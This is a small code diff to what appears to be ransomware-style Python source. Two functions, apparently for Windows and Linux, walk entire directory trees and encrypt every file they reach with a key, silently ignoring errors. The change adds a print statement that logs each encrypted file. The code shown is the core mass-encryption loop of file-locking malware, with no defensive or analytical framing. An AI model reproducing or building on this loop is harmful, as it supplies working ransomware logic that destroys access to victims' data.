@@ -14,6 +14,7 @@ def allFilesW():
             else:
                 try:
                     encryption.file_encryption(os.path.join(root, directory), KEY)
+                    print("encrypted file -->", os.path.join(root, directory))
                     counter = counter + 1
                 except:
                     pass
@@ -31,6 +32,7 @@ def allFilesL():
             else:
                 try:
                     encryption.file_encryption(os.path.join(root, directory), KEY)
+                    print("encrypted file -->", os.path.join(root, directory))
                     counter = counter + 1
                 except:
                     pass
